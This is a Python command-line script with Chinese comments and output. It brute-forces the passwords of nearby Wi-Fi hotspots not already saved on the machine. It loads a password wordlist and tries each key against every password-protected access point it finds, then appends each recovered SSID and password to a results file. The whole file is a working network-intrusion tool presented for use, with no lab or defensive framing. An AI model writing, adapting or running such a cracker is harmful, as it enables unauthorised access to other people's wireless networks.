#! /usr/bin/python3

import os

import pywifi
from pywifi import const  # 引用一些定义
from tqdm import tqdm

from cracker_util import get_aps, try_connect, classify_aps, sample_passwords


def main(password_file, count=5, iface_name=None, result_file='results.txt', stype=1, progressbar=False):
    if not os.path.isfile(password_file):
        print('[!]密码本文件不存在')
        return

    print('[+]获取网卡')
    wifi = pywifi.PyWiFi()  # 抓取网卡接口
    ifaces = wifi.interfaces()
    if len(ifaces) == 0:
        print('[-]没有可用的网卡')
        return
    else:
        if not iface_name:
            iface = ifaces[0]  # 获取网卡，对于wifi连接服务，默认为0号网卡
            print('[-]成功获取网卡 %s' % (iface.name()))
        else:
            for iface in ifaces:
                if iface.name() == iface_name:
                    print('[-]成功获取网卡 %s' % (iface_name))
                    break
            else:
                print('[-]不存在名称为%s的无线网卡' % (iface_name))
                return

    print('[+]导入已经计算机存储的网络PROFILES')
    saved_ssids = [profile.ssid for profile in iface.network_profiles()]
    print('[*]已保存的PROFILES的SSID为', saved_ssids)
    print('[-]完成导入已经计算机存储的网络')

    print('[+]扫描当前可用热点，并选出需要密码破解的热点')
    scanned_profiles = get_aps(
        iface, count=count, filtered_ssids=saved_ssids)  # 扫描当前可用的热点
    needpwd_profiles, _ = classify_aps(scanned_profiles)  # 分开需要密码和不需要密码的热点
    print('[*]需要破解的热点为', [profile.ssid for profile in needpwd_profiles])
    print('[-]完成扫描')

    # 不需要密码的热点通常都是需要额外的验证操作的，由使用者自行把握
    # 只考虑需要密码的热点
    cracked_table = {}

    print('[+]导入密码本')
    passwords = []
    with open(password_file) as f:
        for line in f:
            passwords.append(line.strip('\n'))
    print('[-]成功导入密码本')

    print('[+]开始暴力破解')

    for profile in needpwd_profiles:
        ssid = profile.ssid
        print('[+]开始破解SSID:', ssid)

        profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元 /cipher - AP的密码类型

        passwords_guess = sample_passwords(passwords, stype)

        print('[ ]所用的密码总数为%s' % (len(passwords_guess)))

        if progressbar:
            key_iterator = tqdm(passwords_guess, desc='Passwords')
        else:
            key_iterator = passwords_guess

        for key in key_iterator:
            profile.key = key
            if try_connect(iface, profile):
                cracked_table[profile.ssid] = key
                with open(result_file, 'a') as f:
                    f.write('%s : %s\n' % (ssid, key))
                print('[*]使用密码 %s 破解 %s成功' % (key, ssid))
                break

        print('[-]结束破解SSID:', profile.ssid)

    print('[*]破解出的密码表为', cracked_table)
    print('[-]暴力破解完成')


def __main__():
    import argparse

    parser = argparse.ArgumentParser(description='暴力破解信号强度考前的热点')
    parser.add_argument('password_file', type=str, help='密码本文件')
    parser.add_argument('-c', '--count', type=int,
                        default=5, help='所要破解的热点个数，默认为破解5个')
    parser.add_argument('-i', '--iface_name', type=str,
                        help='无限网卡名称，window系统可以通过设备管理器查看，' +
                        'linux系统可在/var/run/wpa_supplicant/中查看。' +
                        '默认为第一个网卡设备。')
    parser.add_argument('--result_file', type=str,
                        default='results.txt', help='保存所有热点密码结果文件，默认为results.txt')
    parser.add_argument('-s', '--stype', type=int, default=1,
                        help=sample_passwords.__doc__+'，默认为1')
    parser.add_argument('--progressbar', action='store_true',
                        help='展示需要较长时间运行的任务的进度条')
    args = parser.parse_args()

    main(args.password_file, args.count, iface_name=args.iface_name,
         result_file=args.result_file, stype=args.stype, progressbar=args.progressbar)


if __name__ == '__main__':
    __main__()
